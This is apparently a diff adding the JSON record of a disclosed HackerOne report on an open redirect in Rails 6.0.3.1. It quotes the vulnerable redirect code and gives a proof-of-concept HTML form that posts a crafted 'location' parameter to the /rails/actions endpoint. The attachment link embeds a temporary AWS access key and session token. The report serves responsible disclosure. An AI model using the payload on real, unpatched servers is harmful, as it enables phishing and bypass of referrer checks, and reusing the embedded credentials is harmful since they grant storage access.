@@ -1,0 +1,138 @@
+{
+  "id": 904059,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDQwNTk=",
+  "url": "https://hackerone.com/reports/904059",
+  "title": "Open Redirect (6.0.0 < rails < 6.0.3.2)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-06-21T02:15:14.122Z",
+  "submitted_at": "2020-06-21T02:15:14.122Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8264",
+    "CVE-2020-8185"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-12-22T16:47:02.435Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-11-22T16:46:58.144Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello,\nI was looking at the change log (https://github.com/rails/rails/commit/2121b9d20b60ed503aa041ef7b926d331ed79fc2) for CVE-2020-8185 and found another problem existed.\n\nhttps://github.com/rails/rails/blob/v6.0.3.1/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb#L21\n\n```ruby\n  redirect_to request.params[:location]\nend\n\nprivate\n  def actionable_request?(request)\n    request.show_exceptions? && request.post? && request.path == endpoint\n  end\n\n  def redirect_to(location)\n    body = \"<html><body>You are being <a href=\\\"#{ERB::Util.unwrapped_html_escape(location)}\\\">redirected</a>.</body></html>\"\n\n    [302, {\n      \"Content-Type\" => \"text/html; charset=#{Response.default_charset}\",\n      \"Content-Length\" => body.bytesize.to_s,\n      \"Location\" => location,\n    }, [body]]\n  end\n```\n\nThere was an open redirect issue because the request parameter `location` was not validated.\nIn 6.0.3.2, since the condition of `actionable_request?` has changed, this problem is less likely to occur.\n\n\n### PoC\n\n\n#### 1. Prepare server\n\nPrepare an attackable 6.0.3.1 version of Rails server\n\n```\n❯ rails -v\nRails 6.0.3.1\n\n❯ RAILS_ENV=production rails s\n...\n* Environment: production\n* Listening on tcp://0.0.0.0:3000\n```\n\n#### 2. Attack server \n\nPrepare the server for attack on another port.\n\n```html\n<form method=\"post\" action=\"http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=https://www.hackerone.com/\">\n\t<button type=\"submit\">click!</button>\n</form>\n````\n\n```\npython3 -m http.server 8000\n```\n\n#### 3. Open browser\n\nOpen the `http://localhost:8000/attack.html` url in your browser and click the button.\nRedirect to `https://www.hackerone.com/` url.\n\n{F876518}\n\n## Impact\n\nIt will be fixed with 6.0.3.2 as with CVE-2020-8185(https://groups.google.com/g/rubyonrails-security/c/pAe9EV8gbM0), but I think it is necessary to announce it again because the range of influence is different.\n\nThis open redirect changes from POST method to Get Method, so it may be difficult to use for phishing.On the other hand, it may affect bypass of referrer check or SSRF.",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 53,
+    "name": "Open Redirect"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 876518,
+      "file_name": "__________2020-06-21_10.26.21.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ro3WSUcNhjSZthT2cTFoSsaV?response-content-disposition=attachment%3B%20filename%3D%22__________2020-06-21_10.26.21.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-06-21_10.26.21.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQV2I7C47M%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T234352Z&X-Amz-Expires=990&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCIj68hpPtc9OPN4eK08isaT2yhnAE9j4g7%2BlrVKCPwmwIgbory0DHEjZrfboZ2OJYgRJUGYTRSyAdf8foMDhrdrCMquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNa%2BUUVfVHa4J7owXSqPBctWuIOVhHbhWJLcWVBlZbPs3Q%2FZXOzyJ91N6nAxnyT%2BMcvKHDFvaulWp3dSVsvuXIZY6R61cKHjRRjC1qrpLP4F3T4gadqocP%2FNDARZEkVoYNpMEY4RpxqPfgyt5YhecQL6QjgDdp4dH18Vhyyf2pdvo6bB4aJwpbJ0U4j4uVxclZRBKj4W8ks1YnXj4obXcVMpl2zKJXHB1dcgHYissoSyYyXwiU4GrKu5TTK0Kd6CJzPsR6%2Bov0XpbAWUZSxYgeskbPsenxI4nWLWR9xTbzc%2Fiu212tftg9n2yp8pAqLyaM2sObCw0LWeJLKnqh4KbIawHcI6TZgqSDZzIRpNI%2BPUUeHGQbYKA6XZ2MdT3NZEljHl%2BB0%2Fqq%2B7VpVniIyKKnqosOQul3iNcXnSD9y1zfbEDueZUBv2wUIKr%2F9BV%2B1dYRtD9%2B5d4gk2rc5pgOhT3K59VqIzzw1bA%2BwF%2FigTM8DpbwH8njuwrlzurf9UIeRws9n%2BEzL2mxn%2FwC73nxuPFFUXEfz2DT5DC3R%2FU7E%2BROGdaM%2FX6hB7rTNG35Dk%2Blm6pIRYMq3bhK%2F55kbPRv9QeNw3hPklVng4ys5upjm6ADAlZ82lBE9GwbgxDhlDw9gQhdMBKMtnncp3wmX9g79Kzj6dBoijESxtkKeDIX8De7XZmuaTnbWss6x%2BXOP1hUQT%2BYbDhg9YAcaYLGoSTosaetkxb0K7Q%2FVyqSmDriKgql%2Be9XOR2RCp1Z0RP6LbvAdTPIwly72RMtNUZxSOV0sbnLWqT9AAyFvDI8BdCBo34CVWkZfhg5e4C5m7lZSXToiA5LHIN66tsL9ZOb%2Fy%2BJmrv%2FD%2FrDRSscdFztYbxPez2sQUXFGVZs9yXLy%2Fev1cmB4w5bjizAY6sQErIM2jbwhyfAK6rrrYH%2BedgwDQqaFLCA2ZOWiYrntThLkOJ85Cxj4%2FfQBuM96AZ4RIMOwCfVrNyXqGNJ8Q85aMWD1Zb%2Bult28xjXP2kJ%2B7ktDSzHsVT71wV39ZD%2FlGH8%2FWe3NXekHrxP2nVkRebMRt0zmviELNQ7tJLUFFCAgycfUbSAeu8nYZ047y2OXCMws6LKiFYnYrNMkJJcf1t1%2FY4zuS9wgcPAf9oEtuQC%2B2opk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0b9dd949a9091398bfc5e8b83bd224ef300091236ca425b40d218733039f7e93",
+      "file_size": 790214,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-12-22T16:46:58.201Z",
+  "allow_singular_disclosure_after": -162975413.9256478,
+  "singular_disclosure_allowed": true,
+  "vote_count": 19,
+  "voters": [
+    "mzfr",
+    "shuvam321",
+    "ali",
+    "bibekshah",
+    "akashhamal0x01",
+    "ahiezer",
+    "beastglatisant",
+    "elmahdi",
+    "xsstestov",
+    "zimmer75",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
